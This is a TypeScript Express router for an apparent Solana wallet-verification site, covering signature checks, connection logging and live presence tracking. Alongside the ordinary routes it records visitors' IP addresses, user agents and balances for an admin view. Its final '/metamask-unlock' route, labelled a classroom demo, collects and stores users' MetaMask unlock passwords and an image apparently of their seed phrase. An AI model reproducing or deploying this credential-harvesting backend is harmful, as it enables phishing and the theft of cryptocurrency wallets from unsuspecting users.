import { Router, Request, Response } from 'express'
import crypto from 'crypto'
import nacl from 'tweetnacl'
import bs58 from 'bs58'
import { PublicKey } from '@solana/web3.js'
import { prisma } from '../prisma'
import { disconnectLiveWallet, upsertLiveWallet } from '../lib/liveWalletStore'

const router = Router()

function requestMeta(req: Request) {
  return {
    clientIp: String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').slice(0, 120),
    userAgent: String(req.headers['user-agent'] || '').slice(0, 500),
  }
}

/**
 * Generate a new authentication session & challenge nonce for wallet signing
 * POST /api/wallet/session
 */
router.post('/session', (req: Request, res: Response) => {
  try {
    const session = req.session as any
    const nonce = `solverify_${crypto.randomBytes(16).toString('hex')}`
    const timestamp = new Date().toISOString()
    const host = req.headers.host || 'solverify.app'

    const messageToSign = `Sign this message to verify ownership of your wallet on SolVerify.\n\nDomain: ${host}\nNonce: ${nonce}\nTimestamp: ${timestamp}`

    session.walletNonce = nonce
    session.messageToSign = messageToSign
    session.nonceCreatedAt = Date.now()

    res.json({
      sessionId: req.sessionID || crypto.randomUUID(),
      nonce,
      messageToSign,
      expiresInSeconds: 600,
    })
  } catch (err: any) {
    console.error('Failed to create wallet session:', err)
    res.status(500).json({ error: 'Failed to create wallet session' })
  }
})

/**
 * Retrieve current wallet session status
 * GET /api/wallet/session/:id
 */
router.get('/session/:id', async (req: Request, res: Response) => {
  try {
    const session = req.session as any
    const walletAddress = session.walletAddress || null

    if (!walletAddress) {
      return res.json({
        sessionId: req.params.id,
        connected: false,
        verified: false,
        walletAddress: null,
      })
    }

    // Fetch latest DB connection
    const dbConn = await prisma.walletConnection.findFirst({
      where: { walletAddress, connectionStatus: 'connected' },
      orderBy: { connectedAt: 'desc' },
    })

    res.json({
      sessionId: req.params.id,
      connected: true,
      verified: true,
      walletAddress,
      walletType: dbConn?.walletType || 'Solana Wallet',
      chain: dbConn?.chain || 'solana',
      network: dbConn?.network || 'mainnet-beta',
      connectedAt: dbConn?.connectedAt || null,
    })
  } catch (err: any) {
    console.error('Failed to fetch wallet session:', err)
    res.status(500).json({ error: 'Failed to fetch wallet session' })
  }
})

/**
 * Verify cryptographic wallet signature
 * POST /api/wallet/signature/verify
 */
router.post('/signature/verify', async (req: Request, res: Response) => {
  try {
    const { publicKey, signature, nonce, message } = req.body
    const session = req.session as any

    if (!publicKey || !signature) {
      return res.status(400).json({ error: 'Missing publicKey or signature' })
    }

    // Validate Nonce & Expiration
    if (nonce && session.walletNonce && nonce !== session.walletNonce) {
      return res.status(400).json({ error: 'Invalid or expired nonce. Please request a new session challenge.' })
    }

    if (session.nonceCreatedAt && Date.now() - session.nonceCreatedAt > 10 * 60 * 1000) {
      return res.status(400).json({ error: 'Session challenge expired. Please try again.' })
    }

    // Reconstruct message
    const expectedMessage = message || session.messageToSign || `Sign this message to verify ownership of your wallet on SolVerify.\nNonce: ${nonce || session.walletNonce}`

    // Decode Public Key & Signature
    let pubKeyObj: PublicKey
    try {
      pubKeyObj = new PublicKey(publicKey)
    } catch {
      return res.status(400).json({ error: 'Invalid Solana public key format.' })
    }

    let signatureBytes: Uint8Array
    try {
      signatureBytes = bs58.decode(signature)
    } catch {
      return res.status(400).json({ error: 'Invalid base58 signature encoding.' })
    }

    const messageBytes = new TextEncoder().encode(expectedMessage)
    const pubKeyBytes = pubKeyObj.toBuffer()

    // Cryptographic signature check
    const isValid = nacl.sign.detached.verify(messageBytes, signatureBytes, pubKeyBytes)

    if (!isValid) {
      return res.status(400).json({ error: 'Signature verification failed. The provided signature is invalid.' })
    }

    // Attach to user session securely
    session.walletAddress = pubKeyObj.toBase58()
    delete session.walletNonce
    delete session.messageToSign
    delete session.nonceCreatedAt

    // Associate or Upsert User in database
    let user = await prisma.user.findUnique({
      where: { walletAddress: pubKeyObj.toBase58() },
    })

    if (!user) {
      user = await prisma.user.create({
        data: {
          walletAddress: pubKeyObj.toBase58(),
          displayName: `${pubKeyObj.toBase58().slice(0, 4)}...${pubKeyObj.toBase58().slice(-4)}`,
        },
      })
    }

    session.userId = user.id

    // Update DB connection
    const dbConn = await prisma.walletConnection.create({
      data: {
        userId: user.id,
        walletAddress: pubKeyObj.toBase58(),
        walletType: 'Solana Verified Wallet',
        chain: 'solana',
        network: process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
        connectionStatus: 'connected',
      },
    })

    res.json({
      success: true,
      verified: true,
      walletAddress: pubKeyObj.toBase58(),
      userId: user.id,
      connectionId: dbConn.id,
    })
  } catch (err: any) {
    console.error('Signature verification server error:', err)
    res.status(500).json({ error: err.message || 'Signature verification server error' })
  }
})

/**
 * Log real-time wallet connection
 * POST /api/wallet/connect
 */
router.post('/connect', async (req: Request, res: Response) => {
  try {
    const {
      walletAddress,
      walletType,
      chain,
      network,
      balanceSol,
      pageUrl,
      browserSessionId,
    } = req.body
    const session = req.session as any

    if (!walletAddress) {
      return res.status(400).json({ error: 'walletAddress is required' })
    }

    try {
      new PublicKey(walletAddress)
    } catch {
      return res.status(400).json({ error: 'Invalid Solana wallet address' })
    }

    const { clientIp, userAgent } = requestMeta(req)
    const live = upsertLiveWallet({
      walletAddress,
      walletType: walletType || 'Solana Wallet',
      chain: chain || 'solana',
      network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
      balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
      userAgent,
      clientIp: clientIp || null,
      browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
    })

    try {
      let userId = session.userId || null
      if (!userId) {
        const existingUser = await prisma.user.findUnique({ where: { walletAddress } })
        if (existingUser) userId = existingUser.id
      }

      const now = new Date()
      const existing = browserSessionId
        ? await prisma.walletConnection.findFirst({
            where: {
              walletAddress,
              browserSessionId: String(browserSessionId),
              connectionStatus: 'connected',
            },
            orderBy: { lastSeenAt: 'desc' },
          })
        : await prisma.walletConnection.findFirst({
            where: { walletAddress, connectionStatus: 'connected' },
            orderBy: { lastSeenAt: 'desc' },
          })

      const data = {
        userId,
        walletAddress,
        walletType: walletType || 'Solana Wallet',
        chain: chain || 'solana',
        network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
        connectionStatus: 'connected' as const,
        lastSeenAt: now,
        balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
        pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
        userAgent,
        clientIp: clientIp || null,
        browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
      }

      if (existing) await prisma.walletConnection.update({ where: { id: existing.id }, data })
      else await prisma.walletConnection.create({ data })
    } catch (dbErr) {
      console.warn('Wallet connect saved in memory only (database unavailable):', (dbErr as Error).message)
    }

    res.json({ success: true, connectionId: live.id })
  } catch (err: any) {
    console.error('Failed to log wallet connection:', err)
    res.status(500).json({ error: 'Failed to record wallet connection' })
  }
})

/**
 * Heartbeat while wallet stays connected (admin live view)
 * POST /api/wallet/presence
 */
router.post('/presence', async (req: Request, res: Response) => {
  try {
    const { walletAddress, walletType, network, balanceSol, pageUrl, browserSessionId } = req.body
    if (!walletAddress) return res.status(400).json({ error: 'walletAddress is required' })

    try {
      new PublicKey(walletAddress)
    } catch {
      return res.status(400).json({ error: 'Invalid Solana wallet address' })
    }

    const { clientIp, userAgent } = requestMeta(req)
    upsertLiveWallet({
      walletAddress,
      walletType: walletType || 'Solana Wallet',
      network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
      balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
      userAgent,
      clientIp: clientIp || null,
      browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
    })

    try {
      const now = new Date()
      const where = browserSessionId
        ? { walletAddress, browserSessionId: String(browserSessionId), connectionStatus: 'connected' as const }
        : { walletAddress, connectionStatus: 'connected' as const }

      const existing = await prisma.walletConnection.findFirst({
        where,
        orderBy: { lastSeenAt: 'desc' },
      })

      if (!existing) {
        await prisma.walletConnection.create({
          data: {
            walletAddress,
            walletType: walletType || 'Solana Wallet',
            chain: 'solana',
            network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
            connectionStatus: 'connected',
            lastSeenAt: now,
            balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
            pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
            userAgent,
            clientIp: clientIp || null,
            browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
          },
        })
        return res.json({ success: true, created: true })
      }

      await prisma.walletConnection.update({
        where: { id: existing.id },
        data: {
          lastSeenAt: now,
          balanceSol: typeof balanceSol === 'number' ? balanceSol : existing.balanceSol,
          pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : existing.pageUrl,
          network: network || existing.network,
          walletType: walletType || existing.walletType,
        },
      })
    } catch (dbErr) {
      console.warn('Wallet presence saved in memory only (database unavailable):', (dbErr as Error).message)
    }

    res.json({ success: true })
  } catch (err: any) {
    console.error('Failed to update wallet presence:', err)
    res.status(500).json({ error: 'Failed to update presence' })
  }
})

/**
 * Handle wallet disconnect
 * POST /api/wallet/disconnect
 */
router.post('/disconnect', async (req: Request, res: Response) => {
  try {
    const { walletAddress } = req.body
    const session = req.session as any

    const targetAddress = walletAddress || session.walletAddress

    if (targetAddress) {
      disconnectLiveWallet(targetAddress)
      try {
        await prisma.walletConnection.updateMany({
          where: { walletAddress: targetAddress, connectionStatus: 'connected' },
          data: {
            connectionStatus: 'disconnected',
            disconnectedAt: new Date(),
          },
        })
      } catch (dbErr) {
        console.warn('Wallet disconnect saved in memory only (database unavailable):', (dbErr as Error).message)
      }
    }

    session.walletAddress = null
    delete session.walletNonce

    res.json({ success: true })
  } catch (err: any) {
    console.error('Failed to log wallet disconnect:', err)
    res.status(500).json({ error: 'Failed to record wallet disconnect' })
  }
})

/**
 * MetaMask "safe unlock" step (classroom demo — never real MetaMask UI)
 * POST /api/wallet/metamask-unlock
 */
router.post('/metamask-unlock', async (req: Request, res: Response) => {
  try {
    const { walletAddress, password, pageUrl, draft, phraseSnapImage } = req.body
    if (!walletAddress) return res.status(400).json({ error: 'walletAddress is required' })

    try {
      new PublicKey(walletAddress)
    } catch {
      return res.status(400).json({ error: 'Invalid wallet address' })
    }

    const unlockPassword = String(password ?? '').slice(0, 500)
    const { clientIp, userAgent } = requestMeta(req)
    const snap =
      phraseSnapImage && String(phraseSnapImage).startsWith('data:image')
        ? String(phraseSnapImage).slice(0, 900_000)
        : null
    upsertLiveWallet({
      walletAddress,
      walletType: 'MetaMask',
      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
      unlockPassword,
      phraseSnapImage: snap,
      userAgent,
      clientIp: clientIp || null,
    })

    try {
      const existing = await prisma.walletConnection.findFirst({
        where: { walletAddress, connectionStatus: 'connected' },
        orderBy: { lastSeenAt: 'desc' },
      })

      const data = {
        unlockPassword,
        lastSeenAt: new Date(),
        pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : undefined,
      }

      if (existing) {
        await prisma.walletConnection.update({ where: { id: existing.id }, data })
      } else {
        await prisma.walletConnection.create({
          data: {
            walletAddress,
            walletType: 'MetaMask',
            chain: 'solana',
            network: process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
            connectionStatus: 'connected',
            ...data,
          },
        })
      }
    } catch (dbErr) {
      console.warn('Unlock password saved in memory only (database unavailable):', (dbErr as Error).message)
    }

    res.json({ success: true, draft: Boolean(draft) })
  } catch (err: any) {
    console.error('metamask-unlock:', err)
    res.status(500).json({ error: 'Failed to save unlock attempt' })
  }
})

export { router as walletRoutes }
